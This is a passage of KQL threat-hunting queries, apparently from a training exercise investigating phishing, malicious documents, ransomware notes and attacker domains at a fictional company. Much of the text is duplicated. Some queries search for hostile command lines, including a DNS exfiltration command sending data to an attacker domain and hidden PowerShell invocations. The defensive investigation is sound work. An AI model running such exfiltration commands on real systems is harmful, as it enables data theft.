| distinct filename

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
FileCreationEvents
| where hostname in (victim_hostname)
| distinct hostname

ProcessEvents
// All related processes
| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
| where process_commandline has "plink.exe"
| distinct process_commandline

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"
| distinct hostname

ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct role

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct ip_addr

// 5-1, 5-2

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
PassiveDns
| where ip in (external_ip_list)
| distinct ipEmail
| take 10

Employees
| count

Employees
| where ip_addr has "10.10.2.1"

Employees
| where name contains "Jacqueline"
// jacqueline_henderson@castleandsand.com

Email
| where recipient contains "jacqueline_henderson@castleandsand.com"

Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count

Employees
| where name contains "Cristin Genao"

OutboundNetworkEvents
| where src_ip contains "10.10.0.141"
| distinct url

PassiveDns
| where domain contains "shark"
| distinct domain

PassiveDns
| where domain contains "shark"

let karen_ip =
Employees
| where name contains "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ip)
| distinct url

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname

let hostname_ransomware =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (hostname_ransomware)
| distinct role

let IT_hostname =
Employees
| where role has "IT"
| distinct username;
AuthenticationEvents
| where username in (IT_hostname)

let unique_hostnames = 
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (unique_hostnames)
| where role == "IT Helpdesk"
| count

Employees
| where ip_addr has ".46"

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
//A suspicious file was quarantined on host 6S7W-MACHINE: Chomping-Schedule_Changes.xlsx

Employees
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname

let emp_hostnames =
FileCreationEvents
| where filename == "Chomping-Schedule_Changes.xlsx"
| distinct hostname;
let emp_ip =
Employees
| where hostname in (emp_hostnames)
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (emp_ip)
| distinct url
| where url has "xlsx"
| count

let preston_lane_ip =
Employees
| where hostname == "6S7W-MACHINE"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (preston_lane_ip)
| distinct url
| where url has "xlsx"

PassiveDns
| where domain contains "jawfin"
| distinct ip
// 193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)

let returned_ip = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
AuthenticationEvents
| where src_ip in (returned_ip)

Email
| where link contains "sharkfin" or link contains "jawfin"

Email
| where sender contains "legal.sand@verizon.com"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| count

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
PassiveDns
| where domain in (threat_domain)
| distinct ip

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
let threat_account =
PassiveDns
| where domain in (threat_domain)
| distinct ip;
AuthenticationEvents
| where src_ip in (threat_account)
| count 

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
// 220.35.180.137

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "echo"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| sort by process_commandline

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let filename_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (filename_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (parent_process_list)

FileCreationEvents
| where filename endswith ".sharkfin"

Email
| where link contains "shark"

// onionmail.org

PassiveDns
| where domain contains "jawfin"
// https://www.maxmind.com/en/geoip-demo

// https://search.censys.io/hosts/193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)
| distinct src_ip
// https://search.censys.io/hosts/157.242.169.232

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)
// https://attack.mitre.org/software/

// https://attack.mitre.org/software/S0002/

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)
| distinct parent_process_hash

// https://www.virustotal.com/gui/home/upload

// The ransomware family known as Rorschach abuses the legitimate Cortex XDR Dump Service Tool cy.exe to deploy its malicious payload.

Email
| where sender contains "castleandsand_official@outlook.com"

Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"

Email 
| where sender startswith "castleandsand_official@outlook.com" or sender startswith "castleandsandlegaldepartment@gmail.com" 
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct Filename

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
let targeted_domain =
PassiveDns
| where ip in (targeted_Authentication)
| distinct domain;

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where username in (targeted_username)
| where result == "Successful Login"
| distinct hostname

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
let domain_list =
PassiveDns
| where ip in (external_ip_list)
| distinct domain;
let filenames =
OutboundNetworkEvents
| where tostring(parse_url(url).Host) in (domain_list)
| distinct url
| extend Path = tostring(parse_url(url).Path)
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (filenames)
| distinct filename

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
FileCreationEvents
| where hostname in (victim_hostname)
| distinct hostname

ProcessEvents
// All related processes
| where parent_process_name in ("TSVIPSrv.dll", "1.exe", "i.exe", "wmi.dll", "procdump64.exe")
| where process_commandline has "plink.exe"
| distinct process_commandline

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"

let victim_hostname =
FileCreationEvents
| where filename in ("Work-Updates.docx", "HR_Notes.pdf", "employee.lnk", "Employee_Changes.xlsx", "store_updates.xlsx")
| distinct hostname;
ProcessEvents
| where hostname in (victim_hostname)
| where process_commandline !contains "c:\\" and process_commandline !contains "exe" and process_commandline !contains "$"
| distinct hostname

ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct role

let victim_hostname =
ProcessEvents
| where process_commandline contains "Invoke-DNSExfiltrator -i Invoke-DNSExfiltrator.ps1 -d exfil.castlesand.zip -p ssad3 -doh cloudflare -t 500"
| distinct hostname;
Employees
| where hostname in (victim_hostname)
| distinct ip_addr

// 5-1, 5-2

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let external_ip_list =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username)
| distinct src_ip;
PassiveDns
| where ip in (external_ip_list)
| distinct ipEmail
| take 10

Employees
| count

Employees
| where ip_addr has "10.10.2.1"

Employees
| where name contains "Jacqueline"
// jacqueline_henderson@castleandsand.com

Email
| where recipient contains "jacqueline_henderson@castleandsand.com"

Email
| where sender has "sunandsandtrading.com"
| distinct sender
| count

Employees
| where name contains "Cristin Genao"

OutboundNetworkEvents
| where src_ip contains "10.10.0.141"
| distinct url

PassiveDns
| where domain contains "shark"
| distinct domain

PassiveDns
| where domain contains "shark"

let karen_ip =
Employees
| where name contains "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karen_ip)
| distinct url

FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname

let hostname_ransomware =
FileCreationEvents
| where filename contains "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (hostname_ransomware)
| distinct role

let IT_hostname =
Employees
| where role has "IT"
| distinct username;
AuthenticationEvents
| where username in (IT_hostname)

let unique_hostnames = 
FileCreationEvents
| where filename == "PAY_UP_OR_SWIM_WITH_THE_FISHES.txt"
| distinct hostname;
Employees
| where hostname in (unique_hostnames)
| where role == "IT Helpdesk"
| count

Employees
| where ip_addr has ".46"

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
SecurityAlerts
| where description has_any (impact_hosts)

let impact_hosts = FileCreationEvents
| where filename == 'PAY_UP_OR_SWIM_WITH_THE_FISHES.txt'
| distinct hostname;
let helpdesk_hostnames = Employees
| where hostname in (impact_hosts)
| where role contains "IT Helpdesk"
| distinct hostname;
SecurityAlerts
| where description has_any (helpdesk_hostnames)
//A suspicious file was quarantined on host 6S7W-MACHINE: Chomping-Schedule_Changes.xlsx

Employees
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| where hostname contains "6S7W"

FileCreationEvents
| where filename == 'Chomping-Schedule_Changes.xlsx'
| distinct hostname

let emp_hostnames =
FileCreationEvents
| where filename == "Chomping-Schedule_Changes.xlsx"
| distinct hostname;
let emp_ip =
Employees
| where hostname in (emp_hostnames)
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (emp_ip)
| distinct url
| where url has "xlsx"
| count

let preston_lane_ip =
Employees
| where hostname == "6S7W-MACHINE"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (preston_lane_ip)
| distinct url
| where url has "xlsx"

PassiveDns
| where domain contains "jawfin"
| distinct ip
// 193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)

let returned_ip = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
AuthenticationEvents
| where src_ip in (returned_ip)

Email
| where link contains "sharkfin" or link contains "jawfin"

Email
| where sender contains "legal.sand@verizon.com"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| count

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
PassiveDns
| where domain in (threat_domain)
| distinct ip

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let threat_domain =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result;
let threat_account =
PassiveDns
| where domain in (threat_domain)
| distinct ip;
AuthenticationEvents
| where src_ip in (threat_account)
| count 

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
// 220.35.180.137

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "echo"

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| sort by process_commandline

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let filename_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (filename_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name == "powershell.exe"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where process_commandline has_any (parent_process_list)

FileCreationEvents
| where filename endswith ".sharkfin"

Email
| where link contains "shark"

// onionmail.org

PassiveDns
| where domain contains "jawfin"
// https://www.maxmind.com/en/geoip-demo

// https://search.censys.io/hosts/193.248.75.126

let returned_query = 
PassiveDns
| where domain contains "sharkfin" or domain contains "jawfin"
| distinct ip;
InboundNetworkEvents
| where src_ip in (returned_query)
| distinct src_ip
// https://search.censys.io/hosts/157.242.169.232

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
FileCreationEvents
| where filename in (file_list)
// https://attack.mitre.org/software/

// https://attack.mitre.org/software/S0002/

let email_list =
Email
| where (sender == "legal.sand@verizon.com") and (recipient contains "castleandsand.com")
| distinct reply_to; 
let file_list =
Email
| where (reply_to has_any (email_list)) or (recipient has_any (email_list))
| extend Path = tostring(parse_url(link).Path) // Getting the Path section only
| extend Filename = tostring(parse_path(Path).Filename)
| distinct Filename;
let hostname_list =
FileCreationEvents
| where filename in (file_list)
| distinct hostname;
let parent_process_list =
ProcessEvents
| where hostname in (hostname_list)
| where timestamp > datetime(2023-05-25T16:43:20Z)
| where process_name contains "powershell"
| where process_commandline contains "powershell.exe -nop -w hidden -c"
| distinct parent_process_name;
ProcessEvents
| where parent_process_name in (parent_process_list)
| distinct parent_process_hash

// https://www.virustotal.com/gui/home/upload

// The ransomware family known as Rorschach abuses the legitimate Cortex XDR Dump Service Tool cy.exe to deploy its malicious payload.

Email
| where sender contains "castleandsand_official@outlook.com"

Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"

Email 
| where sender startswith "castleandsand_official@outlook.com" or sender startswith "castleandsandlegaldepartment@gmail.com" 
| extend Result = tostring(parse_url(link).Host) // Getting the Host section only
| distinct Result

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip

let targeted_roles =
Email
| where sender contains "castleandsand_official@outlook.com" or sender contains "castleandsandlegaldepartment@gmail.com"
| distinct recipient;
let targeted_id_addr =
Employees
| distinct ip_addr;
let targeted_username =
Employees
| where email_addr in (targeted_roles)
| distinct username;
let targeted_Authentication =
AuthenticationEvents
| where not(src_ip in (targeted_id_addr)) and result == "Successful Login" and username in (targeted_username) and description !has "incorrect"
| distinct src_ip;
InboundNetworkEvents
| where src_ip in (targeted_Authentication)
| where url has "download=true&"
| extend Filename = tostring(parse_url(url).['Query Parameters']['output'])
| distinct Filename

let targeted_roles =
Email
